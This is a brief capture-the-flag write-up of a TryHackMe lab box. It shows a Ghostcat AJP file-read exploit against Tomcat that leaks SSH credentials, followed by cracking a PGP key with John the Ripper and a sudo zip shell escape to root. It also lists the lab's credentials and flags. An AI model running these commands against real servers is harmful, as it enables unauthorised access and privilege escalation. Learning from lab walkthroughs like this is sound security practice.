IP : 10.10.192.206

Open Ports : 22,59,8009,8080

Enumeration :

8009 : Apache j Serve binary fro proxying inbound requests to backend server

8080 : Apache tomcat, default page.

Nothing much in the directories on 8080.

Searching about 8009, we found that there is a recent CVE and the exploit is called ghostcat.

Download it from https://github.com/00theway/Ghostcat-CNVD-2020-10487.git

Use the exploit as : python3 ajpShooter.py http://10.10.193.206 8009 /WEB-INF/web.xml read

We got a credential : skyfuck:8730281lkjlkjdqlksalks


Lets ssh : 
We found two files :
	tryhackme.asc
	credentials.pgp
	
Also navigating to another user : merlin

We can can read user.txt : THM{GhostCat_1s_so_cr4sy}

Reading tryhackme.asc we found that it is a private kgp key : use gpg2john for the hash and use john and rockyou.txt : alexandru

Read the credentials.pgp file.

use gpg --import to import the key
use gpg --decrypt to decrypt the pgp file

We got a credential : merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

Change user:

User changed :

PrivEsc:

run sudo -l

can run zip as root

	User merlin may run the following commands on ubuntu:
	(root : root) NOPASSWD: /usr/bin/zip

Check GTFOBins:
	Found sudo exploit :

	TF=$(mktemp -u)
	sudo zip $TF /etc/hosts -T -TT 'sh #'
	sudo rm $TF

Got root shell, navigate and get root flag : THM{Z1P_1S_FAKE}

!!!
